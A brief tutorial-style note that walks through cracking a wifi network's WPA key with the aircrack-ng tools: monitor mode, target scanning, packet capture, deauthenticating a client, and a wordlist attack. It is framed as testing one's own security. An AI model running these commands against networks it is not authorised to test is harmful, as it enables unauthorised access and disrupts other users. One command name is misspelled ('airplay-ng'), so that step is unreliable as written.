# Aircrack

In order to test your wifi security you can use the well known aircrack tools.

Preparing the interface :

    airmon-ng start wlan0

Identification of the target :

    airodump-ng mon0

Getting some IVs

    airodump-ng -c <channel> --bssid <B:S:S:I:D> -w wpa --ivs mon0

In parralel unconnect the client to have more IVs

    airplay-ng -0 5 -a <B:S:S:I:D> -c <mac:c:l:i:ent> mon0

Crack from the IVs

    aircrack-ng -w /tmp/password.lst wpa*.cap

